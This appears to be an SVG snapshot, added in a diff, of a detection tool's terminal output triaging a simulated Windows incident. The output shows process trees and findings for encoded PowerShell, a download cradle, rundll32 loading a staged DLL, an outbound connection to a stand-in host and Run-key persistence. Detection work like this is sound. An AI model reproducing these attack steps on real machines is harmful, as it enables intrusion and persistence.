+</text><text class="terminal-2458574024-r3" x="195.2" y="752" textLength="48.8" clip-path="url(#terminal-2458574024-line-30)">└──&#160;</text><text class="terminal-2458574024-r7" x="244" y="752" textLength="12.2" clip-path="url(#terminal-2458574024-line-30)">!</text><text class="terminal-2458574024-r2" x="256.2" y="752" textLength="573.4" clip-path="url(#terminal-2458574024-line-30)">&#160;rundll32.exe&#160;C:\Users\Public\stage.dll,Start&#160;&#160;</text><text class="terminal-2458574024-r7" x="829.6" y="752" textLength="268.4" clip-path="url(#terminal-2458574024-line-30)">GR-001&#160;NET-001&#160;PER-001</text><text class="terminal-2458574024-r2" x="1464" y="752" textLength="12.2" clip-path="url(#terminal-2458574024-line-30)">
+</text><text class="terminal-2458574024-r3" x="244" y="776.4" textLength="48.8" clip-path="url(#terminal-2458574024-line-31)">├──&#160;</text><text class="terminal-2458574024-r3" x="292.8" y="776.4" textLength="36.6" clip-path="url(#terminal-2458574024-line-31)">net</text><text class="terminal-2458574024-r2" x="329.4" y="776.4" textLength="488" clip-path="url(#terminal-2458574024-line-31)">&#160;→&#160;198.51.100.20:443/tcp&#160;(cdn[.]example)</text><text class="terminal-2458574024-r2" x="1464" y="776.4" textLength="12.2" clip-path="url(#terminal-2458574024-line-31)">
+</text><text class="terminal-2458574024-r3" x="244" y="800.8" textLength="48.8" clip-path="url(#terminal-2458574024-line-32)">└──&#160;</text><text class="terminal-2458574024-r3" x="292.8" y="800.8" textLength="36.6" clip-path="url(#terminal-2458574024-line-32)">reg</text><text class="terminal-2458574024-r2" x="1464" y="800.8" textLength="12.2" clip-path="url(#terminal-2458574024-line-32)">
+</text><text class="terminal-2458574024-r2" x="292.8" y="825.2" textLength="1171.2" clip-path="url(#terminal-2458574024-line-33)">HKU\S-1-5-21-3623811015-3361044348-30300820-1013\Software\Microsoft\Windows\CurrentVersion\Run\U</text><text class="terminal-2458574024-r2" x="1464" y="825.2" textLength="12.2" clip-path="url(#terminal-2458574024-line-33)">
+</text><text class="terminal-2458574024-r2" x="292.8" y="849.6" textLength="390.4" clip-path="url(#terminal-2458574024-line-34)">pdater&#160;=&#160;C:\Users\Public\upd.exe</text><text class="terminal-2458574024-r2" x="1464" y="849.6" textLength="12.2" clip-path="url(#terminal-2458574024-line-34)">
+</text><text class="terminal-2458574024-r4" x="12.2" y="874" textLength="146.4" clip-path="url(#terminal-2458574024-line-35)">Scope&#160;&#160;&#160;&#160;&#160;&#160;&#160;</text><text class="terminal-2458574024-r2" x="158.6" y="874" textLength="1000.4" clip-path="url(#terminal-2458574024-line-35)">1&#160;user&#160;·&#160;5&#160;processes&#160;·&#160;2&#160;files&#160;(2&#160;executable)&#160;·&#160;1&#160;persistence&#160;key&#160;·&#160;2&#160;destinations</text><text class="terminal-2458574024-r2" x="1464" y="874" textLength="12.2" clip-path="url(#terminal-2458574024-line-35)">
+</text><text class="terminal-2458574024-r4" x="12.2" y="898.4" textLength="146.4" clip-path="url(#terminal-2458574024-line-36)">Review&#160;&#160;&#160;&#160;&#160;&#160;</text><text class="terminal-2458574024-r2" x="158.6" y="898.4" textLength="1024.8" clip-path="url(#terminal-2458574024-line-36)">verify&#160;5&#160;processes&#160;·&#160;review&#160;1&#160;persistence&#160;key&#160;·&#160;review&#160;2&#160;files&#160;·&#160;hunt&#160;2&#160;destinations</text><text class="terminal-2458574024-r2" x="1464" y="898.4" textLength="12.2" clip-path="url(#terminal-2458574024-line-36)">
+</text><text class="terminal-2458574024-r2" x="1464" y="922.8" textLength="12.2" clip-path="url(#terminal-2458574024-line-37)">
+</text><text class="terminal-2458574024-r4" x="0" y="947.2" textLength="24.4" clip-path="url(#terminal-2458574024-line-38)">S2</text><text class="terminal-2458574024-r2" x="24.4" y="947.2" textLength="744.2" clip-path="url(#terminal-2458574024-line-38)">&#160;·&#160;root&#160;upd.exe&#160;·&#160;ws-14.corp.example&#160;·&#160;NT&#160;AUTHORITY\SYSTEM&#160;·&#160;</text><text class="terminal-2458574024-r8" x="768.6" y="947.2" textLength="73.2" clip-path="url(#terminal-2458574024-line-38)">MEDIUM</text><text class="terminal-2458574024-r2" x="841.8" y="947.2" textLength="622.2" clip-path="url(#terminal-2458574024-line-38)">&#160;·&#160;3&#160;tactics&#160;·&#160;3&#160;findings&#160;·&#160;2026-10-12T11:00:00Z&#160;→&#160;</text><text class="terminal-2458574024-r2" x="1464" y="947.2" textLength="12.2" clip-path="url(#terminal-2458574024-line-38)">
+</text><text class="terminal-2458574024-r2" x="0" y="971.6" textLength="207.4" clip-path="url(#terminal-2458574024-line-39)">11:01:10Z&#160;(1m10s)</text><text class="terminal-2458574024-r2" x="1464" y="971.6" textLength="12.2" clip-path="url(#terminal-2458574024-line-39)">
+</text><text class="terminal-2458574024-r3" x="0" y="996" textLength="256.2" clip-path="url(#terminal-2458574024-line-40)">services.exe&#160;(anchor)</text><text class="terminal-2458574024-r2" x="1464" y="996" textLength="12.2" clip-path="url(#terminal-2458574024-line-40)">
+</text><text class="terminal-2458574024-r3" x="0" y="1020.4" textLength="48.8" clip-path="url(#terminal-2458574024-line-41)">└──&#160;</text><text class="terminal-2458574024-r8" x="48.8" y="1020.4" textLength="12.2" clip-path="url(#terminal-2458574024-line-41)">!</text><text class="terminal-2458574024-r2" x="61" y="1020.4" textLength="122" clip-path="url(#terminal-2458574024-line-41)">&#160;upd.exe&#160;&#160;</text><text class="terminal-2458574024-r4" x="183" y="1020.4" textLength="183" clip-path="url(#terminal-2458574024-line-41)">↩&#160;dropped&#160;by&#160;S1</text><text class="terminal-2458574024-r4" x="378.2" y="1020.4" textLength="231.8" clip-path="url(#terminal-2458574024-line-41)">↩&#160;persistence&#160;of&#160;S1</text><text class="terminal-2458574024-r8" x="634.4" y="1020.4" textLength="256.2" clip-path="url(#terminal-2458574024-line-41)">GR-002&#160;GR-003&#160;LOC-001</text><text class="terminal-2458574024-r2" x="1464" y="1020.4" textLength="12.2" clip-path="url(#terminal-2458574024-line-41)">
+</text><text class="terminal-2458574024-r3" x="48.8" y="1044.8" textLength="48.8" clip-path="url(#terminal-2458574024-line-42)">├──&#160;</text><text class="terminal-2458574024-r2" x="97.6" y="1044.8" textLength="268.4" clip-path="url(#terminal-2458574024-line-42)">whoami.exe&#160;whoami&#160;/all</text><text class="terminal-2458574024-r2" x="1464" y="1044.8" textLength="12.2" clip-path="url(#terminal-2458574024-line-42)">
+</text><text class="terminal-2458574024-r3" x="48.8" y="1069.2" textLength="48.8" clip-path="url(#terminal-2458574024-line-43)">├──&#160;</text><text class="terminal-2458574024-r2" x="97.6" y="1069.2" textLength="317.2" clip-path="url(#terminal-2458574024-line-43)">ipconfig.exe&#160;ipconfig&#160;/all</text><text class="terminal-2458574024-r2" x="1464" y="1069.2" textLength="12.2" clip-path="url(#terminal-2458574024-line-43)">
+</text><text class="terminal-2458574024-r3" x="48.8" y="1093.6" textLength="48.8" clip-path="url(#terminal-2458574024-line-44)">└──&#160;</text><text class="terminal-2458574024-r2" x="97.6" y="1093.6" textLength="305" clip-path="url(#terminal-2458574024-line-44)">systeminfo.exe&#160;systeminfo</text><text class="terminal-2458574024-r2" x="1464" y="1093.6" textLength="12.2" clip-path="url(#terminal-2458574024-line-44)">
+</text><text class="terminal-2458574024-r4" x="12.2" y="1118" textLength="146.4" clip-path="url(#terminal-2458574024-line-45)">Scope&#160;&#160;&#160;&#160;&#160;&#160;&#160;</text><text class="terminal-2458574024-r2" x="158.6" y="1118" textLength="1012.6" clip-path="url(#terminal-2458574024-line-45)">1&#160;user&#160;·&#160;4&#160;processes&#160;·&#160;0&#160;files&#160;(0&#160;executable)&#160;·&#160;0&#160;persistence&#160;keys&#160;·&#160;0&#160;destinations</text><text class="terminal-2458574024-r2" x="1464" y="1118" textLength="12.2" clip-path="url(#terminal-2458574024-line-45)">
+</text><text class="terminal-2458574024-r4" x="12.2" y="1142.4" textLength="146.4" clip-path="url(#terminal-2458574024-line-46)">Review&#160;&#160;&#160;&#160;&#160;&#160;</text><text class="terminal-2458574024-r2" x="158.6" y="1142.4" textLength="1037" clip-path="url(#terminal-2458574024-line-46)">verify&#160;4&#160;processes&#160;·&#160;review&#160;0&#160;persistence&#160;keys&#160;·&#160;review&#160;0&#160;files&#160;·&#160;hunt&#160;0&#160;destinations</text><text class="terminal-2458574024-r2" x="1464" y="1142.4" textLength="12.2" clip-path="url(#terminal-2458574024-line-46)">
+</text><text class="terminal-2458574024-r6" x="0" y="1166.8" textLength="1464" clip-path="url(#terminal-2458574024-line-47)">Findings&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</text><text class="terminal-2458574024-r2" x="1464" y="1166.8" textLength="12.2" clip-path="url(#terminal-2458574024-line-47)">
+</text><text class="terminal-2458574024-r2" x="1464" y="1191.2" textLength="12.2" clip-path="url(#terminal-2458574024-line-48)">
+</text><text class="terminal-2458574024-r4" x="24.4" y="1215.6" textLength="97.6" clip-path="url(#terminal-2458574024-line-49)">Severity</text><text class="terminal-2458574024-r4" x="158.6" y="1215.6" textLength="85.4" clip-path="url(#terminal-2458574024-line-49)">Rule&#160;&#160;&#160;</text><text class="terminal-2458574024-r4" x="280.6" y="1215.6" textLength="219.6" clip-path="url(#terminal-2458574024-line-49)">Title&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</text><text class="terminal-2458574024-r4" x="536.8" y="1215.6" textLength="170.8" clip-path="url(#terminal-2458574024-line-49)">Process&#160;&#160;&#160;&#160;&#160;&#160;&#160;</text><text class="terminal-2458574024-r4" x="744.2" y="1215.6" textLength="219.6" clip-path="url(#terminal-2458574024-line-49)">Host&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</text><text class="terminal-2458574024-r4" x="1000.4" y="1215.6" textLength="244" clip-path="url(#terminal-2458574024-line-49)">First&#160;seen&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</text><text class="terminal-2458574024-r4" x="1281" y="1215.6" textLength="61" clip-path="url(#terminal-2458574024-line-49)">Count</text><text class="terminal-2458574024-r4" x="1378.6" y="1215.6" textLength="61" clip-path="url(#terminal-2458574024-line-49)">Story</text><text class="terminal-2458574024-r2" x="1464" y="1215.6" textLength="12.2" clip-path="url(#terminal-2458574024-line-49)">
+</text><text class="terminal-2458574024-r2" x="0" y="1240" textLength="1464" clip-path="url(#terminal-2458574024-line-50)">&#160;──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────&#160;</text><text class="terminal-2458574024-r2" x="1464" y="1240" textLength="12.2" clip-path="url(#terminal-2458574024-line-50)">
+</text><text class="terminal-2458574024-r8" x="24.4" y="1264.4" textLength="73.2" clip-path="url(#terminal-2458574024-line-51)">MEDIUM</text><text class="terminal-2458574024-r2" x="158.6" y="1264.4" textLength="85.4" clip-path="url(#terminal-2458574024-line-51)">CMD-001</text><text class="terminal-2458574024-r2" x="280.6" y="1264.4" textLength="219.6" clip-path="url(#terminal-2458574024-line-51)">Encoded&#160;PowerShell</text><text class="terminal-2458574024-r2" x="536.8" y="1264.4" textLength="170.8" clip-path="url(#terminal-2458574024-line-51)">cmd.exe&#160;&#160;&#160;&#160;&#160;&#160;&#160;</text><text class="terminal-2458574024-r2" x="744.2" y="1264.4" textLength="219.6" clip-path="url(#terminal-2458574024-line-51)">ws-14.corp.example</text><text class="terminal-2458574024-r2" x="1000.4" y="1264.4" textLength="244" clip-path="url(#terminal-2458574024-line-51)">2026-10-12T10:02:05Z</text><text class="terminal-2458574024-r2" x="1281" y="1264.4" textLength="61" clip-path="url(#terminal-2458574024-line-51)">&#160;&#160;&#160;&#160;1</text><text class="terminal-2458574024-r2" x="1378.6" y="1264.4" textLength="61" clip-path="url(#terminal-2458574024-line-51)">S1&#160;&#160;&#160;</text><text class="terminal-2458574024-r2" x="1464" y="1264.4" textLength="12.2" clip-path="url(#terminal-2458574024-line-51)">
+</text><text class="terminal-2458574024-r2" x="280.6" y="1288.8" textLength="219.6" clip-path="url(#terminal-2458574024-line-52)">command&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</text><text class="terminal-2458574024-r2" x="1464" y="1288.8" textLength="12.2" clip-path="url(#terminal-2458574024-line-52)">
+</text><text class="terminal-2458574024-r7" x="24.4" y="1313.2" textLength="48.8" clip-path="url(#terminal-2458574024-line-53)">HIGH</text><text class="terminal-2458574024-r2" x="158.6" y="1313.2" textLength="85.4" clip-path="url(#terminal-2458574024-line-53)">LIN-001</text><text class="terminal-2458574024-r2" x="280.6" y="1313.2" textLength="219.6" clip-path="url(#terminal-2458574024-line-53)">Office&#160;application</text><text class="terminal-2458574024-r2" x="536.8" y="1313.2" textLength="170.8" clip-path="url(#terminal-2458574024-line-53)">cmd.exe&#160;&#160;&#160;&#160;&#160;&#160;&#160;</text><text class="terminal-2458574024-r2" x="744.2" y="1313.2" textLength="219.6" clip-path="url(#terminal-2458574024-line-53)">ws-14.corp.example</text><text class="terminal-2458574024-r2" x="1000.4" y="1313.2" textLength="244" clip-path="url(#terminal-2458574024-line-53)">2026-10-12T10:02:05Z</text><text class="terminal-2458574024-r2" x="1281" y="1313.2" textLength="61" clip-path="url(#terminal-2458574024-line-53)">&#160;&#160;&#160;&#160;1</text><text class="terminal-2458574024-r2" x="1378.6" y="1313.2" textLength="61" clip-path="url(#terminal-2458574024-line-53)">S1&#160;&#160;&#160;</text><text class="terminal-2458574024-r2" x="1464" y="1313.2" textLength="12.2" clip-path="url(#terminal-2458574024-line-53)">
+</text><text class="terminal-2458574024-r2" x="280.6" y="1337.6" textLength="219.6" clip-path="url(#terminal-2458574024-line-54)">spawned&#160;an&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</text><text class="terminal-2458574024-r2" x="1464" y="1337.6" textLength="12.2" clip-path="url(#terminal-2458574024-line-54)">
+</text><text class="terminal-2458574024-r2" x="280.6" y="1362" textLength="219.6" clip-path="url(#terminal-2458574024-line-55)">interpreter&#160;&#160;&#160;&#160;&#160;&#160;&#160;</text><text class="terminal-2458574024-r2" x="1464" y="1362" textLength="12.2" clip-path="url(#terminal-2458574024-line-55)">
+</text><text class="terminal-2458574024-r8" x="24.4" y="1386.4" textLength="73.2" clip-path="url(#terminal-2458574024-line-56)">MEDIUM</text><text class="terminal-2458574024-r2" x="158.6" y="1386.4" textLength="85.4" clip-path="url(#terminal-2458574024-line-56)">CMD-001</text><text class="terminal-2458574024-r2" x="280.6" y="1386.4" textLength="219.6" clip-path="url(#terminal-2458574024-line-56)">Encoded&#160;PowerShell</text><text class="terminal-2458574024-r2" x="536.8" y="1386.4" textLength="170.8" clip-path="url(#terminal-2458574024-line-56)">powershell.exe</text><text class="terminal-2458574024-r2" x="744.2" y="1386.4" textLength="219.6" clip-path="url(#terminal-2458574024-line-56)">ws-14.corp.example</text><text class="terminal-2458574024-r2" x="1000.4" y="1386.4" textLength="244" clip-path="url(#terminal-2458574024-line-56)">2026-10-12T10:02:06Z</text><text class="terminal-2458574024-r2" x="1281" y="1386.4" textLength="61" clip-path="url(#terminal-2458574024-line-56)">&#160;&#160;&#160;&#160;1</text><text class="terminal-2458574024-r2" x="1378.6" y="1386.4" textLength="61" clip-path="url(#terminal-2458574024-line-56)">S1&#160;&#160;&#160;</text><text class="terminal-2458574024-r2" x="1464" y="1386.4" textLength="12.2" clip-path="url(#terminal-2458574024-line-56)">
+</text><text class="terminal-2458574024-r2" x="280.6" y="1410.8" textLength="219.6" clip-path="url(#terminal-2458574024-line-57)">command&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</text><text class="terminal-2458574024-r2" x="1464" y="1410.8" textLength="12.2" clip-path="url(#terminal-2458574024-line-57)">
+</text><text class="terminal-2458574024-r7" x="24.4" y="1435.2" textLength="48.8" clip-path="url(#terminal-2458574024-line-58)">HIGH</text><text class="terminal-2458574024-r2" x="158.6" y="1435.2" textLength="85.4" clip-path="url(#terminal-2458574024-line-58)">CMD-002</text><text class="terminal-2458574024-r2" x="280.6" y="1435.2" textLength="219.6" clip-path="url(#terminal-2458574024-line-58)">PowerShell&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</text><text class="terminal-2458574024-r2" x="536.8" y="1435.2" textLength="170.8" clip-path="url(#terminal-2458574024-line-58)">powershell.exe</text><text class="terminal-2458574024-r2" x="744.2" y="1435.2" textLength="219.6" clip-path="url(#terminal-2458574024-line-58)">ws-14.corp.example</text><text class="terminal-2458574024-r2" x="1000.4" y="1435.2" textLength="244" clip-path="url(#terminal-2458574024-line-58)">2026-10-12T10:02:06Z</text><text class="terminal-2458574024-r2" x="1281" y="1435.2" textLength="61" clip-path="url(#terminal-2458574024-line-58)">&#160;&#160;&#160;&#160;1</text><text class="terminal-2458574024-r2" x="1378.6" y="1435.2" textLength="61" clip-path="url(#terminal-2458574024-line-58)">S1&#160;&#160;&#160;</text><text class="terminal-2458574024-r2" x="1464" y="1435.2" textLength="12.2" clip-path="url(#terminal-2458574024-line-58)">
+</text><text class="terminal-2458574024-r2" x="280.6" y="1459.6" textLength="219.6" clip-path="url(#terminal-2458574024-line-59)">download&#160;cradle&#160;&#160;&#160;</text><text class="terminal-2458574024-r2" x="1464" y="1459.6" textLength="12.2" clip-path="url(#terminal-2458574024-line-59)">
+</text><text class="terminal-2458574024-r7" x="24.4" y="1484" textLength="48.8" clip-path="url(#terminal-2458574024-line-60)">HIGH</text><text class="terminal-2458574024-r2" x="158.6" y="1484" textLength="85.4" clip-path="url(#terminal-2458574024-line-60)">GR-001&#160;</text><text class="terminal-2458574024-r2" x="280.6" y="1484" textLength="219.6" clip-path="url(#terminal-2458574024-line-60)">Office-descended&#160;&#160;</text><text class="terminal-2458574024-r2" x="536.8" y="1484" textLength="170.8" clip-path="url(#terminal-2458574024-line-60)">powershell.exe</text><text class="terminal-2458574024-r2" x="744.2" y="1484" textLength="219.6" clip-path="url(#terminal-2458574024-line-60)">ws-14.corp.example</text><text class="terminal-2458574024-r2" x="1000.4" y="1484" textLength="244" clip-path="url(#terminal-2458574024-line-60)">2026-10-12T10:02:08Z</text><text class="terminal-2458574024-r2" x="1281" y="1484" textLength="61" clip-path="url(#terminal-2458574024-line-60)">&#160;&#160;&#160;&#160;1</text><text class="terminal-2458574024-r2" x="1378.6" y="1484" textLength="61" clip-path="url(#terminal-2458574024-line-60)">S1&#160;&#160;&#160;</text><text class="terminal-2458574024-r2" x="1464" y="1484" textLength="12.2" clip-path="url(#terminal-2458574024-line-60)">
+</text><text class="terminal-2458574024-r2" x="280.6" y="1508.4" textLength="219.6" clip-path="url(#terminal-2458574024-line-61)">process&#160;connected&#160;</text><text class="terminal-2458574024-r2" x="1464" y="1508.4" textLength="12.2" clip-path="url(#terminal-2458574024-line-61)">
+</text><text class="terminal-2458574024-r2" x="280.6" y="1532.8" textLength="219.6" clip-path="url(#terminal-2458574024-line-62)">out&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</text><text class="terminal-2458574024-r2" x="1464" y="1532.8" textLength="12.2" clip-path="url(#terminal-2458574024-line-62)">
+</text><text class="terminal-2458574024-r7" x="24.4" y="1557.2" textLength="48.8" clip-path="url(#terminal-2458574024-line-63)">HIGH</text><text class="terminal-2458574024-r2" x="158.6" y="1557.2" textLength="85.4" clip-path="url(#terminal-2458574024-line-63)">GR-001&#160;</text><text class="terminal-2458574024-r2" x="280.6" y="1557.2" textLength="219.6" clip-path="url(#terminal-2458574024-line-63)">Office-descended&#160;&#160;</text><text class="terminal-2458574024-r2" x="536.8" y="1557.2" textLength="170.8" clip-path="url(#terminal-2458574024-line-63)">rundll32.exe&#160;&#160;</text><text class="terminal-2458574024-r2" x="744.2" y="1557.2" textLength="219.6" clip-path="url(#terminal-2458574024-line-63)">ws-14.corp.example</text><text class="terminal-2458574024-r2" x="1000.4" y="1557.2" textLength="244" clip-path="url(#terminal-2458574024-line-63)">2026-10-12T10:02:30Z</text><text class="terminal-2458574024-r2" x="1281" y="1557.2" textLength="61" clip-path="url(#terminal-2458574024-line-63)">&#160;&#160;&#160;&#160;1</text><text class="terminal-2458574024-r2" x="1378.6" y="1557.2" textLength="61" clip-path="url(#terminal-2458574024-line-63)">S1&#160;&#160;&#160;</text><text class="terminal-2458574024-r2" x="1464" y="1557.2" textLength="12.2" clip-path="url(#terminal-2458574024-line-63)">
+</text><text class="terminal-2458574024-r2" x="280.6" y="1581.6" textLength="219.6" clip-path="url(#terminal-2458574024-line-64)">process&#160;connected&#160;</text><text class="terminal-2458574024-r2" x="1464" y="1581.6" textLength="12.2" clip-path="url(#terminal-2458574024-line-64)">
+</text><text class="terminal-2458574024-r2" x="280.6" y="1606" textLength="219.6" clip-path="url(#terminal-2458574024-line-65)">out&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</text><text class="terminal-2458574024-r2" x="1464" y="1606" textLength="12.2" clip-path="url(#terminal-2458574024-line-65)">
+</text><text class="terminal-2458574024-r7" x="24.4" y="1630.4" textLength="48.8" clip-path="url(#terminal-2458574024-line-66)">HIGH</text><text class="terminal-2458574024-r2" x="158.6" y="1630.4" textLength="85.4" clip-path="url(#terminal-2458574024-line-66)">NET-001</text><text class="terminal-2458574024-r2" x="280.6" y="1630.4" textLength="219.6" clip-path="url(#terminal-2458574024-line-66)">Proxy-execution&#160;&#160;&#160;</text><text class="terminal-2458574024-r2" x="536.8" y="1630.4" textLength="170.8" clip-path="url(#terminal-2458574024-line-66)">rundll32.exe&#160;&#160;</text><text class="terminal-2458574024-r2" x="744.2" y="1630.4" textLength="219.6" clip-path="url(#terminal-2458574024-line-66)">ws-14.corp.example</text><text class="terminal-2458574024-r2" x="1000.4" y="1630.4" textLength="244" clip-path="url(#terminal-2458574024-line-66)">2026-10-12T10:02:30Z</text><text class="terminal-2458574024-r2" x="1281" y="1630.4" textLength="61" clip-path="url(#terminal-2458574024-line-66)">&#160;&#160;&#160;&#160;1</text><text class="terminal-2458574024-r2" x="1378.6" y="1630.4" textLength="61" clip-path="url(#terminal-2458574024-line-66)">S1&#160;&#160;&#160;</text><text class="terminal-2458574024-r2" x="1464" y="1630.4" textLength="12.2" clip-path="url(#terminal-2458574024-line-66)">
+</text><text class="terminal-2458574024-r2" x="280.6" y="1654.8" textLength="219.6" clip-path="url(#terminal-2458574024-line-67)">binary&#160;made&#160;a&#160;&#160;&#160;&#160;&#160;</text><text class="terminal-2458574024-r2" x="1464" y="1654.8" textLength="12.2" clip-path="url(#terminal-2458574024-line-67)">
+</text><text class="terminal-2458574024-r2" x="280.6" y="1679.2" textLength="219.6" clip-path="url(#terminal-2458574024-line-68)">network&#160;connection</text><text class="terminal-2458574024-r2" x="1464" y="1679.2" textLength="12.2" clip-path="url(#terminal-2458574024-line-68)">
+</text><text class="terminal-2458574024-r8" x="24.4" y="1703.6" textLength="73.2" clip-path="url(#terminal-2458574024-line-69)">MEDIUM</text><text class="terminal-2458574024-r2" x="158.6" y="1703.6" textLength="85.4" clip-path="url(#terminal-2458574024-line-69)">PER-001</text><text class="terminal-2458574024-r2" x="280.6" y="1703.6" textLength="219.6" clip-path="url(#terminal-2458574024-line-69)">Registry&#160;Run&#160;key&#160;&#160;</text><text class="terminal-2458574024-r2" x="536.8" y="1703.6" textLength="170.8" clip-path="url(#terminal-2458574024-line-69)">rundll32.exe&#160;&#160;</text><text class="terminal-2458574024-r2" x="744.2" y="1703.6" textLength="219.6" clip-path="url(#terminal-2458574024-line-69)">ws-14.corp.example</text><text class="terminal-2458574024-r2" x="1000.4" y="1703.6" textLength="244" clip-path="url(#terminal-2458574024-line-69)">2026-10-12T10:02:40Z</text><text class="terminal-2458574024-r2" x="1281" y="1703.6" textLength="61" clip-path="url(#terminal-2458574024-line-69)">&#160;&#160;&#160;&#160;1</text><text class="terminal-2458574024-r2" x="1378.6" y="1703.6" textLength="61" clip-path="url(#terminal-2458574024-line-69)">S1&#160;&#160;&#160;</text><text class="terminal-2458574024-r2" x="1464" y="1703.6" textLength="12.2" clip-path="url(#terminal-2458574024-line-69)">
+</text><text class="terminal-2458574024-r2" x="280.6" y="1728" textLength="219.6" clip-path="url(#terminal-2458574024-line-70)">set&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</text><text class="terminal-2458574024-r2" x="1464" y="1728" textLength="12.2" clip-path="url(#terminal-2458574024-line-70)">
+</text><text class="terminal-2458574024-r8" x="24.4" y="1752.4" textLength="73.2" clip-path="url(#terminal-2458574024-line-71)">MEDIUM</text><text class="terminal-2458574024-r2" x="158.6" y="1752.4" textLength="85.4" clip-path="url(#terminal-2458574024-line-71)">GR-003&#160;</text><text class="terminal-2458574024-r2" x="280.6" y="1752.4" textLength="219.6" clip-path="url(#terminal-2458574024-line-71)">Dropped&#160;file&#160;later</text><text class="terminal-2458574024-r2" x="536.8" y="1752.4" textLength="170.8" clip-path="url(#terminal-2458574024-line-71)">upd.exe&#160;&#160;&#160;&#160;&#160;&#160;&#160;</text><text class="terminal-2458574024-r2" x="744.2" y="1752.4" textLength="219.6" clip-path="url(#terminal-2458574024-line-71)">ws-14.corp.example</text><text class="terminal-2458574024-r2" x="1000.4" y="1752.4" textLength="244" clip-path="url(#terminal-2458574024-line-71)">2026-10-12T11:00:00Z</text><text class="terminal-2458574024-r2" x="1281" y="1752.4" textLength="61" clip-path="url(#terminal-2458574024-line-71)">&#160;&#160;&#160;&#160;1</text><text class="terminal-2458574024-r2" x="1378.6" y="1752.4" textLength="61" clip-path="url(#terminal-2458574024-line-71)">S2&#160;&#160;&#160;</text><text class="terminal-2458574024-r2" x="1464" y="1752.4" textLength="12.2" clip-path="url(#terminal-2458574024-line-71)">
+</text><text class="terminal-2458574024-r2" x="280.6" y="1776.8" textLength="219.6" clip-path="url(#terminal-2458574024-line-72)">executed&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</text><text class="terminal-2458574024-r2" x="1464" y="1776.8" textLength="12.2" clip-path="url(#terminal-2458574024-line-72)">
+</text><text class="terminal-2458574024-r9" x="24.4" y="1801.2" textLength="36.6" clip-path="url(#terminal-2458574024-line-73)">LOW</text><text class="terminal-2458574024-r2" x="158.6" y="1801.2" textLength="85.4" clip-path="url(#terminal-2458574024-line-73)">LOC-001</text><text class="terminal-2458574024-r2" x="280.6" y="1801.2" textLength="219.6" clip-path="url(#terminal-2458574024-line-73)">Execution&#160;from&#160;a&#160;&#160;</text><text class="terminal-2458574024-r2" x="536.8" y="1801.2" textLength="170.8" clip-path="url(#terminal-2458574024-line-73)">upd.exe&#160;&#160;&#160;&#160;&#160;&#160;&#160;</text><text class="terminal-2458574024-r2" x="744.2" y="1801.2" textLength="219.6" clip-path="url(#terminal-2458574024-line-73)">ws-14.corp.example</text><text class="terminal-2458574024-r2" x="1000.4" y="1801.2" textLength="244" clip-path="url(#terminal-2458574024-line-73)">2026-10-12T11:00:00Z</text><text class="terminal-2458574024-r2" x="1281" y="1801.2" textLength="61" clip-path="url(#terminal-2458574024-line-73)">&#160;&#160;&#160;&#160;1</text><text class="terminal-2458574024-r2" x="1378.6" y="1801.2" textLength="61" clip-path="url(#terminal-2458574024-line-73)">S2&#160;&#160;&#160;</text><text class="terminal-2458574024-r2" x="1464" y="1801.2" textLength="12.2" clip-path="url(#terminal-2458574024-line-73)">
+</text><text class="terminal-2458574024-r2" x="280.6" y="1825.6" textLength="219.6" clip-path="url(#terminal-2458574024-line-74)">user-writable&#160;&#160;&#160;&#160;&#160;</text><text class="terminal-2458574024-r2" x="1464" y="1825.6" textLength="12.2" clip-path="url(#terminal-2458574024-line-74)">
+</text><text class="terminal-2458574024-r2" x="280.6" y="1850" textLength="219.6" clip-path="url(#terminal-2458574024-line-75)">staging&#160;path&#160;&#160;&#160;&#160;&#160;&#160;</text><text class="terminal-2458574024-r2" x="1464" y="1850" textLength="12.2" clip-path="url(#terminal-2458574024-line-75)">
